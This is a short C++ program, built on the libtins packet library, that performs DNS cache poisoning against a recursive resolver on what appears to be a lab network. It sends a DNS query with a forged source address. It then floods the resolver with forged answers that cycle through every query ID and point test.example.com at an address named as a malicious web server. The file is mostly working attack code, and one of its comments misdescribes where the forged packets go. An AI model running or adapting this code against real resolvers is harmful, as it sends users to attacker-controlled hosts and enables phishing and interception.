#include <tins/tins.h>

using namespace Tins;

#define MAX_QUERY_ID 0xffff
#define MIN_QUERY_ID 0x0000

#define VICTIM_IP "192.168.1.2"
#define RECURSIVE_DNS "192.168.1.254"
#define AUTHORITATIVE_DNS "2.2.2.254"
#define COM_DNS "3.3.3.1"
#define ATTACKING_DOMAIN "example.com"
#define ATTACKING_HOST "test.example.com"
#define MALICIOUS_NS "ns.attacker.com"
#define MALICIOUS_NS_IP "1.1.1.254"
#define MALICIOUS_WEBSERVER "1.1.1.3"

int main() {
    PacketSender sender;

    // Send a DNS query to the victim
    DNS dns_request;
    dns_request.type(DNS::QUERY);
    dns_request.id(1234);
    dns_request.recursion_desired(1);

    DNS::query dns_query(ATTACKING_HOST, DNS::A, DNS::IN);
    dns_request.add_query(dns_query);

    IP query_pkt = IP(RECURSIVE_DNS, VICTIM_IP) / UDP(53, 1234) / dns_request;
    sender.send(query_pkt);

    for(unsigned int query_id = MIN_QUERY_ID; query_id < MAX_QUERY_ID; query_id++) {
        // Send a DNS response to the authoritative server
        DNS dns_response;
        dns_response.type(DNS::RESPONSE);
        dns_response.id(query_id);
        dns_response.recursion_desired(1);
        dns_response.add_query(dns_query);

        DNS::resource dns_answer1(ATTACKING_HOST, MALICIOUS_WEBSERVER, DNS::A, DNS::IN, 259200);
        dns_response.add_answer(dns_answer1);

        IP resp_pkt = IP(RECURSIVE_DNS, AUTHORITATIVE_DNS) / UDP(33333, 53) / dns_response;
        sender.send(resp_pkt);
    }
}
